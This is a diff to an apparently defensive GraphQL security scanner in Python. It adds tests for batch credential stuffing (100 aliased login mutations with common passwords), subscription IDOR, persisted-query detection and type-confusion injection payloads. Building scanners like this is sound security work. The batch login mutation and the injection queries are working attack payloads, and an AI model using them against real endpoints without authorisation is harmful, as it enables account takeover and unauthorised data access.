@@ -1033,6 +1033,257 @@ class GraphQLScanEngine:
     # Orchestration
     # ------------------------------------------------------------------ #
 
+    # ── Phase 2: Advanced GraphQL Attack Vectors (Pillar 4.4) ────────────────
+
+    def test_batch_credential_stuffing(self, endpoint: str) -> List[dict]:
+        """
+        Batch query credential stuffing — send 100 login mutations in one request.
+
+        GraphQL batching allows multiple operations per HTTP request.
+        Rate limiting that counts HTTP requests (not operations) is bypassed.
+        This is the most impactful GraphQL-specific attack against login endpoints.
+        """
+        findings: List[dict] = []
+        # Build 100 aliased login mutations with different passwords
+        _sample_users   = ["admin", "user@example.com", "test", "root", "administrator"]
+        _sample_passwords = ["password", "123456", "admin", "letmein", "password123",
+                              "welcome", "monkey", "dragon", "master", "abc123"]
+        ops = []
+        idx = 0
+        for user in _sample_users:
+            for pwd in _sample_passwords:
+                ops.append(
+                    f'  l{idx}: login(username: "{user}", password: "{pwd}") '
+                    f'{{ token userId }}'
+                )
+                idx += 1
+
+        batch_mutation = "mutation BatchLogin {\n" + "\n".join(ops) + "\n}"
+        try:
+            resp = self._session.post(
+                endpoint,
+                json={"query": batch_mutation},
+                timeout=20,
+            )
+            if resp.status_code in (200, 400) and resp.text:
+                body = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {}
+                # If the server processed the batch without rate limiting
+                errors = body.get("errors", [])
+                data   = body.get("data", {})
+                # A successful bypass: ≥ 5 aliased operations returned
+                returned_ops = len([k for k in (data or {}) if k.startswith("l")])
+                all_errors    = all(v is None for v in (data or {}).values())
+                if returned_ops >= 5 and not all_errors:
+                    findings.append(_make_finding(
+                        endpoint=endpoint,
+                        vuln_type="graphql_batch_credential_stuffing",
+                        title="GraphQL Batch Login — Rate Limit Bypass",
+                        severity="high",
+                        evidence=(
+                            f"Server processed {returned_ops} aliased login operations in a single "
+                            f"HTTP request without rate limiting. This enables credential stuffing "
+                            f"at the rate of (HTTP rate limit × {returned_ops}) attempts/period."
+                        ),
+                        payload=batch_mutation[:300],
+                    ))
+                    log.info("Batch credential stuffing: %d operations processed at %s", returned_ops, endpoint)
+                elif resp.status_code == 200 and "rateLimit" not in str(errors) and idx > 0:
+                    log.debug("Batch mutation sent but no success signals at %s", endpoint)
+        except Exception as exc:
+            log.debug("test_batch_credential_stuffing failed on %s: %s", endpoint, exc)
+        return findings
+
+    def test_subscription_idor(self, endpoint: str, schema: dict) -> List[dict]:
+        """
+        Subscribe to events for objects you don't own.
+
+        GraphQL subscriptions open a long-lived WebSocket connection. Authorization
+        checks on subscription operations are often weaker than on queries/mutations.
+        Test whether a non-owner can subscribe to private event streams.
+        """
+        findings: List[dict] = []
+        _ws_endpoint = endpoint.replace("https://", "wss://").replace("http://", "ws://")
+
+        # Detect subscription type from schema
+        sub_type = (schema.get("data", {})
+                         .get("__schema", {})
+                         .get("subscriptionType") or {})
+        sub_type_name = sub_type.get("name") if sub_type else None
+
+        # Build test subscriptions for common event patterns
+        test_subscriptions = [
+            ("orderUpdated",   'subscription { orderUpdated(orderId: "1") { status total } }'),
+            ("messageReceived",'subscription { messageReceived(userId: "1") { content sender } }'),
+            ("notificationNew",'subscription { notificationNew(userId: "1") { message type } }'),
+        ]
+        if sub_type_name:
+            test_subscriptions.append(
+                (sub_type_name, f'subscription {{ {sub_type_name}(id: "1") {{ id }} }}')
+            )
+
+        for op_name, sub_query in test_subscriptions:
+            try:
+                # Test via HTTP POST first (some implementations accept POST for subscriptions)
+                resp = self._session.post(
+                    endpoint,
+                    json={"query": sub_query},
+                    timeout=8,
+                )
+                if resp.status_code in (200, 400):
+                    body = {}
+                    try:
+                        body = resp.json()
+                    except Exception:
+                        pass
+                    errors = body.get("errors", [])
+                    err_text = str(errors).lower()
+                    # If no auth error — subscription accepted without ownership check
+                    if (resp.status_code == 200 and
+                            body.get("data") is not None and
+                            "unauthorized" not in err_text and
+                            "forbidden" not in err_text and
+                            "permission" not in err_text):
+                        findings.append(_make_finding(
+                            endpoint=endpoint,
+                            vuln_type="graphql_subscription_idor",
+                            title=f"GraphQL Subscription IDOR — {op_name}",
+                            severity="high",
+                            evidence=(
+                                f"Subscription '{op_name}' accepted without ownership verification. "
+                                f"Non-owner may receive real-time events for objects they don't own."
+                            ),
+                            payload=sub_query,
+                        ))
+            except Exception as exc:
+                log.debug("test_subscription_idor %s on %s: %s", op_name, endpoint, exc)
+        return findings
+
+    def test_persisted_query_enum(self, endpoint: str) -> List[dict]:
+        """
+        Enumerate persisted queries by hash — discover hidden functionality.
+
+        Applications may pre-register GraphQL queries stored by SHA-256 hash.
+        Submitting a valid hash executes the pre-registered query, bypassing
+        the application's normal field-level authorization controls.
+        """
+        findings: List[dict] = []
+        # Common persisted query hash patterns (APQ — Automatic Persisted Queries)
+        _test_extensions = [
+            {"persistedQuery": {"version": 1, "sha256Hash": "0" * 64}},           # zero hash
+            {"persistedQuery": {"version": 1, "sha256Hash": "a" * 64}},           # all-a hash
+            {"persistedQuery": {"version": 1, "sha256Hash": "1" * 64}},           # all-1 hash
+        ]
+        for ext in _test_extensions:
+            try:
+                resp = self._session.post(
+                    endpoint,
+                    json={"extensions": ext, "variables": {}},
+                    timeout=8,
+                )
+                if resp.status_code == 200:
+                    body = {}
+                    try:
+                        body = resp.json()
+                    except Exception:
+                        pass
+                    errors = body.get("errors", [])
+                    err_messages = [str(e.get("message","")).lower() for e in errors]
+                    # APQ server returns "PersistedQueryNotFound" — server supports APQ
+                    if any("persistedquery" in m or "not found" in m for m in err_messages):
+                        # APQ is supported — enumerate known operation hashes
+                        findings.append(_make_finding(
+                            endpoint=endpoint,
+                            vuln_type="graphql_apq_enabled",
+                            title="GraphQL Automatic Persisted Queries Enabled",
+                            severity="medium",
+                            evidence=(
+                                "Server supports Automatic Persisted Queries (APQ). "
+                                "An attacker who obtains or guesses a valid operation hash "
+                                "can execute pre-registered queries, potentially bypassing "
+                                "application-layer authorization or field restrictions."
+                            ),
+                            payload=str(ext),
+                        ))
+                        break
+            except Exception as exc:
+                log.debug("test_persisted_query_enum on %s: %s", endpoint, exc)
+        return findings
+
+    def test_type_confusion_injection(self, endpoint: str, schema: dict) -> List[dict]:
+        """
+        Type confusion injection — send wrong types to bypass application-layer validation.
+
+        GraphQL's type coercion may allow integers where strings are expected, objects
+        where scalars are expected, or arrays where single values are expected.
+        Application-layer validation often checks only the expected type.
+        """
+        findings: List[dict] = []
+        # Test inputs: send deliberately wrong types for common sensitive operations
+        _type_confusion_payloads = [
+            # String field with integer — bypasses string length validators
+            ("query { user(id: 1) { email } }",           "integer_as_id"),
+            # Boolean injection
+            ('query { login(username: "admin", password: true) { token } }', "bool_as_password"),
+            # Array injection — parameter pollution
+            ('query { user(id: ["1","2","3"]) { email role } }', "array_as_id"),
+            # Object injection
+            ('query { user(id: {__proto__: "1"}) { email role } }', "object_as_id"),
+            # Null coercion
+            ('query { user(id: null) { email role permissions } }', "null_id_disclosure"),
+        ]
+
+        for gql_query, confusion_type in _type_confusion_payloads:
+            try:
+                resp = self._session.post(
+                    endpoint,
+                    json={"query": gql_query},
+                    timeout=8,
+                )
+                if resp.status_code not in (200, 400):
+                    continue
+                body = {}
+                try:
+                    body = resp.json()
+                except Exception:
+                    continue
+                errors    = body.get("errors", [])
+                data      = body.get("data", {})
+                err_text  = str(errors).lower()
+
+                # Signal: query processed (data returned) despite wrong type input
+                if data and any(data.values()) and "coercion" not in err_text:
+                    findings.append(_make_finding(
+                        endpoint=endpoint,
+                        vuln_type="graphql_type_confusion",
+                        title=f"GraphQL Type Confusion — {confusion_type}",
+                        severity="medium",
+                        evidence=(
+                            f"Server accepted and processed a '{confusion_type}' type confusion input. "
+                            f"Application-layer validation may be bypassed. "
+                            f"Response data keys: {list(data.keys())[:5]}"
+                        ),
+                        payload=gql_query,
+                    ))
+                # Signal: server error reveals internal type handling
+                elif errors and any(
+                    kw in err_text for kw in
+                    ["internal", "unexpected", "coercion failed", "type error", "cannot parse"]
+                ):
+                    findings.append(_make_finding(
+                        endpoint=endpoint,
+                        vuln_type="graphql_type_confusion_error_disclosure",
+                        title=f"GraphQL Type Confusion — Error Disclosure ({confusion_type})",
+                        severity="low",
+                        evidence=(
+                            f"Type confusion input '{confusion_type}' triggered an internal error "
+                            f"that reveals implementation details: {err_text[:200]}"
+                        ),
+                        payload=gql_query,
+                    ))
+            except Exception as exc:
+                log.debug("test_type_confusion_injection %s on %s: %s",
+                          confusion_type, endpoint, exc)
+        return findings
     def run(self) -> List[dict]:
         """
         Run all GraphQL security tests and return a normalized findings list.
@@ -1128,6 +1379,35 @@ class GraphQLScanEngine:
                 all_findings.extend(privesc_findings)
             except Exception as exc:
                 log.warning("test_privilege_escalation_mutations failed on %s: %s", endpoint, exc)
+
+            # Phase 2: Batch credential stuffing (rate limit bypass via aliasing)
+            try:
+                batch_cs = self.test_batch_credential_stuffing(endpoint)
+                all_findings.extend(batch_cs)
+            except Exception as exc:
+                log.warning("test_batch_credential_stuffing failed on %s: %s", endpoint, exc)
+
+            # Phase 2: Subscription IDOR
+            try:
+                sub_idor = self.test_subscription_idor(endpoint, schema)
+                all_findings.extend(sub_idor)
+            except Exception as exc:
+                log.warning("test_subscription_idor failed on %s: %s", endpoint, exc)
+
+            # Phase 2: Persisted query enumeration (APQ)
+            try:
+                apq_findings = self.test_persisted_query_enum(endpoint)
+                all_findings.extend(apq_findings)
+            except Exception as exc:
+                log.warning("test_persisted_query_enum failed on %s: %s", endpoint, exc)
+
+            # Phase 2: Type confusion injection
+            try:
+                type_conf = self.test_type_confusion_injection(endpoint, schema)
+                all_findings.extend(type_conf)
+            except Exception as exc:
+                log.warning("test_type_confusion_injection failed on %s: %s", endpoint, exc)
+
 
         log.info(
             "GraphQL scan complete for %s — %d finding(s)",
